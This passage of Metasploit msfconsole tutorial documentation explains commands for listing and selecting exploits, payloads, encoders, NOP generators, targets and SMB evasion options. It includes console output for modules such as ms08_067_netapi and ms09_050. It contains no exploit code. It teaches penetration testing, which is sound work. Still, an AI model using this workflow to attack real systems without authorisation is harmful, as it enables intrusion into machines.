   aix/rpc_ttdbserverd_realpath                                   2009-06-17       great      ToolTalk rpc.ttdbserverd _tt_internal_realpath Buffer Overflow (AIX)
   bsdi/softcart/mercantec_softcart                               2004-08-19       great      Mercantec SoftCart CGI Overflow
 ...snip...


Using MSFconsole Payloads
^^^^^^

Running show payloads will display all of the different payloads for all platforms available within Metasploit.

::

  msf > show payloads

 Payloads
 ========

   Name                                             Disclosure Date  Rank    Description
   ----                                             ---------------  ----    -----------
   aix/ppc/shell_bind_tcp                                            normal  AIX Command Shell, Bind TCP Inline
   aix/ppc/shell_find_port                                           normal  AIX Command Shell, Find Port Inline
   aix/ppc/shell_interact                                            normal  AIX execve shell for inetd
 ...snip...

payloads
"""""

As you can see, there are a lot of payloads available. Fortunately, when you are in the context of a particular exploit, running show payloads will only display the payloads that are compatible with that particular exploit. For instance, if it is a Windows exploit, you will not be shown the Linux payloads.


::
  msf  exploit(ms08_067_netapi) > show payloads

 Compatible Payloads
 ===================

   Name                                             Disclosure Date  Rank    Description
   ----                                             ---------------  ----    -----------
   generic/custom                                                    normal  Custom Payload
   generic/debug_trap                                                normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                                            normal  Generic Command Shell, Bind TCP Inline
 ...snip...


options
"""""

If you have selected a specific module, you can issue the show options command to display which settings are available and/or required for that specific module.

::

  msf exploit(ms08_067_netapi) > show options

 Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

 Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


targets
"""""

If you aren’t certain whether an operating system is vulnerable to a particular exploit, run the show targets command from within the context of an exploit module to see which targets are supported.

::

 msf  exploit(ms08_067_netapi) > show targets

 Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   10  Windows 2003 SP1 Japanese (NO NX)
   11  Windows 2003 SP2 English (NO NX)
   12  Windows 2003 SP2 English (NX)
 ...snip...

advanced
"""""

If you wish the further fine-tune an exploit, you can see more advanced options by running show advanced.

::

  msf exploit(ms08_067_netapi) > show advanced

 Module advanced options:

   Name           : CHOST
   Current Setting:
   Description    : The local client address

   Name           : CPORT
   Current Setting:
   Description    : The local client port

 ...snip...

encoders
"""""

Running show encoders will display a listing of the encoders that are available within MSF.

::

  msf > show encoders
 Compatible Encoders
 ===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   cmd/generic_sh                           good       Generic Shell Variable Substitution Command Encoder
   cmd/ifs                                  low        Generic ${IFS} Substitution Command Encoder
   cmd/printf_php_mq                        manual     printf(1) via PHP magic_quotes Utility Command Encoder
   generic/none                             normal     The "none" Encoder
   mipsbe/longxor                           normal     XOR Encoder
   mipsle/longxor                           normal     XOR Encoder
   php/base64                               great      PHP Base64 encoder
   ppc/longxor                              normal     PPC LongXOR Encoder
   ppc/longxor_tag                          normal     PPC LongXOR Encoder
   sparc/longxor_tag                        normal     SPARC DWORD XOR Encoder
   x64/xor                                  normal     XOR Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


nops
"""""

Lastly, issuing the show nops command will display the NOP Generators that Metasploit has to offer.

::

  msf > show nops
 NOP Generators
 ==============

   Name             Disclosure Date  Rank    Description
   ----             ---------------  ----    -----------
   armle/simple                      normal  Simple
   mipsbe/better                     normal  Better
   php/generic                       normal  PHP Nop Generator
   ppc/simple                        normal  Simple
   sparc/random                      normal  SPARC NOP Generator
   tty/generic                       normal  TTY Nop Generator
   x64/simple                        normal  Simple
   x86/opty2                         normal  Opty2
   x86/single_byte                   normal  Single Byte


use
"""""

When you have decided on a particular module to make use of, issue the use command to select it. The use command changes your context to a specific module, exposing type-specific commands. Notice in the output below that any global variables that were previously set are already configured.


::

  msf > use dos/windows/smb/ms09_001_write
 msf auxiliary(ms09_001_write) > show options

 Module options:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  445              yes       Set the SMB service port

 msf auxiliary(ms09_001_write) >


Exploits
=======

show Exploits

Selecting an exploit in Metasploit adds the ‘exploit’ and ‘check’ commands to msfconsole.

::

 msf > use  exploit/windows/smb/ms09_050_smb2_negotiate_func_index
 msf exploit(ms09_050_smb2_negotiate_func_index) > help
 ...snip...
 Exploit Commands
 ================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Launch an exploit attempt
    pry           Open a Pry session on the current module
    rcheck        Reloads the module and checks if the target is vulnerable
    reload        Just reloads the module
    rerun         Alias for rexploit
    rexploit      Reloads the module and launches an exploit attempt
    run           Alias for exploit

 msf exploit(ms09_050_smb2_negotiate_func_index) >


show
^^^^

Using an exploit also adds more options to the ‘show’ command.

MSF Exploit Targets
"""""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show targets

 Exploit targets:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


MSF Exploit Payloads
""""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show payloads

 Compatible Payloads
 ===================

   Name                              Disclosure Date  Rank    Description
   ----                              ---------------  ----    -----------
   generic/custom                                     normal  Custom Payload
   generic/debug_trap                                 normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                             normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                          normal  Generic Command Shell, Reverse TCP Inline
   generic/tight_loop                                 normal  Generic x86 Tight Loop
   windows/adduser                                    normal  Windows Execute net user /ADD
 ...snip...

MSF Exploit Options
"""""""

::

  msf exploit(ms09_050_smb2_negotiate_func_index) > show options

 Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  445              yes       The target port (TCP)
   WAIT   180              yes       The number of seconds to wait for the attack to complete.


 Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


Advanced
""""""""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show advanced

 Module advanced options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name                    Current Setting    Required  Description
   ----                    ---------------    --------  -----------
   CHOST                                      no        The local client address
   CPORT                                      no        The local client port
   ConnectTimeout          10                 yes       Maximum number of seconds to establish a TCP connection
   ContextInformationFile                     no        The information file that contains context information
   DisablePayloadHandler   false              no        Disable the handler code for the selected payload
   EnableContextEncoding   false              no        Use transient context when encoding payloads
 ...snip...


Evasion
"""""

::

 msf exploit(ms09_050_smb2_negotiate_func_index) > show evasion
 Module evasion options:

   Name                           Current Setting  Required  Description
   ----                           ---------------  --------  -----------
   SMB::obscure_trans_pipe_level  0                yes       Obscure PIPE string in TransNamedPipe (level 0-3)
   SMB::pad_data_level            0                yes       Place extra padding between headers and data (level 0-3)
   SMB::pad_file_level            0                yes       Obscure path names used in open/create (level 0-3)
   SMB::pipe_evasion              false            yes       Enable segmented read/writes for SMB Pipes
   SMB::pipe_read_max_size        1024             yes       Maximum buffer size for pipe reads
   SMB::pipe_read_min_size        1                yes       Minimum buffer size for pipe reads
   SMB::pipe_write_max_size       1024             yes       Maximum buffer size for pipe writes
   SMB::pipe_write_min_size       1                yes       Minimum buffer size for pipe writes
   TCP::max_send_size             0                no        Maxiumum tcp segment size.  (0 = disable)
   TCP::send_delay                0                no        Delays inserted before every send.  (0 = disable)
